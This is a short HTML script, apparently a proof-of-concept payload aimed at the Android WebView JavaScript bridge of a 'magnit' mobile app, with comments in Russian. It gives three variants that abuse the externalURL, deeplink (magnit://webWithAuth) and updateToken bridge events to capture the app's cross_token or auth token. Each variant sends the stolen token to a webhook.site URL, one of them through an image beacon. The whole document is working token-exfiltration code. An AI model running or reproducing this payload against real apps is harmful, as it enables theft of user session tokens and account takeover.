<script>
var WEBHOOK = 'https://webhook.site/52dbaa1f-6ce3-490d-b01b-32f3ed2b7fe9/b1075553-4052-48c4-b108-af094ad2defe';

// Вариант А: externalURL с cross_token
Android.postMessage(JSON.stringify({
    event: 'externalURL',
    payload: {
        url: WEBHOOK + '?steal=crosstoken&add_crosstoken=true'
    }
}));

// Вариант Б: deeplink → webWithAuth → cross_token в URL
Android.postMessage(JSON.stringify({
    event: 'deeplink',
    payload: {
        url: 'magnit://webWithAuth?url=' + encodeURIComponent(WEBHOOK + '?steal=deeplink') + '&in_app=true'
    }
}));

// Вариант В: updateToken → перехват через callback
Android.postMessage(JSON.stringify({ event: 'updateToken' }));
window.handleMobileMessage = function(data) {
    new Image().src = WEBHOOK + '?steal=token&data=' + encodeURIComponent(data);
};
</script>
